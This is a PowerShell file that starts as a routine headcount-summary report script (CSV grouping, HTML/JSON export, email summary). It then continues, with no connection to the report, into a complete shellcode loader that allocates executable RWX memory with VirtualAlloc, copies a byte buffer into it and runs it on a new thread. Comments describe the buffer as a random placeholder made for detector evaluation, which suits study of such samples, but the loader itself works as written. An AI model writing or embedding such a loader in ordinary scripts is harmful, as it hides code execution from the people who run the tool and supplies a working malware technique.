$InputCsv   = "D:\Incoming\employees.csv"
$OutputPath = 'C:\Logs\reports\headcount-summary-2025-12-19.csv'
$GroupBy    = 'Site'
$MinAmount  = 1000
Set-StrictMode -Version 2.0
if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -Path $OutputPath -NoTypeInformation

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$style = @'
<style>
body { font-family: Calibri; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$jsonBody = $byGroup | ConvertTo-Json -Depth 3
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@adatum.com'
$MailFrom = "bi@adatum.com"

Send-MailMessage -To $MailTo -From $MailFrom -Subject 'Headcount summary' -Body $summaryBody -SmtpServer 'smtp.adatum.com' -Port 587 -UseSsl

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xd1, 0xb4, 0x1f, 0xef, 0x03, 0x83, 0xaf, 0xf4, 0x5d, 0xf1, 0xd2, 0xf6, 0xd1, 0x26, 0x69, 0x39,
    0xcd, 0xc4, 0x51, 0x55, 0xfb, 0xbf, 0x2f, 0x56, 0xb7, 0x49, 0x7a, 0xf7, 0xed, 0x65, 0x85, 0x5e,
    0xd0, 0xb7, 0x26, 0xea, 0x98, 0x60, 0x64, 0xc8, 0xf3, 0xa5, 0x9d, 0xcd, 0x81, 0xf8, 0xaa, 0xaf,
    0x92, 0x17, 0xc2, 0x55, 0xcf, 0x19, 0x45, 0x4e, 0xc0, 0x77, 0x77, 0xb7, 0x96, 0x28, 0x5a, 0xbc,
    0x62, 0xbd, 0xf2, 0x71, 0xcc, 0x63, 0x8c, 0x85, 0x60, 0xc6, 0x88, 0xfa, 0x14, 0x77, 0x50, 0x16,
    0x35, 0x91, 0x48, 0x44, 0x43, 0x1b, 0xae, 0x3e, 0x84, 0x05, 0x34, 0xf3, 0x1c, 0x08, 0x17, 0xbc,
    0x87, 0xb1, 0x0b, 0x42, 0x0c, 0x5e, 0x91, 0x53, 0x25, 0x09, 0x74, 0xf7, 0xde, 0x7b, 0x73, 0xb8,
    0x6a, 0xa2, 0x84, 0xb9, 0x03, 0x1d, 0xbb, 0x8f, 0xc5, 0x31, 0x0d, 0xa3, 0x15, 0x50, 0xa3, 0xc3,
    0xda, 0x45, 0x36, 0x57, 0xd1, 0x1b, 0x7e, 0x6a, 0x9c, 0x44, 0x13, 0xf2, 0x33, 0x6b, 0xe4, 0x30,
    0xc0, 0x2a, 0xc8, 0xbd, 0xb6, 0x84, 0x75, 0xa1, 0x2b, 0xc7, 0x92, 0xe7, 0xd6, 0xbc, 0x4b, 0x13,
    0xc1, 0xa3, 0xb0, 0xca, 0xe1, 0xe0, 0xf0, 0xf5, 0x41, 0x65, 0x60, 0x16, 0x4e, 0x93, 0x27, 0xf8,
    0x51, 0x9a, 0xa0, 0x6d, 0xd2, 0x97, 0x15, 0x87, 0xca, 0x34, 0x4a, 0xde, 0xa6, 0x30, 0x2f, 0x83,
    0x5f, 0x83, 0x52, 0xc1, 0x6e, 0x6e, 0xee, 0xb0, 0xda, 0xc5, 0xb1, 0x69, 0x6e, 0x47, 0x15, 0x8d,
    0xe4, 0x6b, 0xea, 0xc8, 0xf2, 0x56, 0xe4, 0x5f, 0xb8, 0x79, 0x81, 0x91, 0xaf, 0x7f, 0x70, 0xdc,
    0x8c, 0x51, 0x0f, 0x12, 0x29, 0x7f, 0xa2, 0x5a, 0x96, 0xca, 0xf3, 0x5b, 0x8a, 0x10, 0x11, 0x29,
    0x07, 0x92, 0x46, 0x9c, 0xea, 0x6e, 0xed, 0x79, 0xa8, 0x07, 0x5f, 0xf2, 0xe5, 0xc2, 0x79, 0x3d,
    0x22, 0x3b, 0xc0, 0xc5, 0xcd, 0x09, 0xd2, 0xfc, 0x37, 0x9e, 0xa8, 0x49, 0x64, 0xbc, 0xea, 0x0d,
    0xe9, 0x02, 0xf0, 0x5a, 0x8b, 0xe9, 0x65, 0x73, 0x87, 0x41, 0x74, 0x59, 0xa7, 0x05, 0xcd, 0x4c,
    0x05, 0x8b, 0xc5, 0x2b, 0x7d, 0x6d, 0x55, 0x02, 0xb9, 0x33, 0xd2, 0x9f, 0xc4
)

$MemoryHandle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($MemoryHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 4100)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
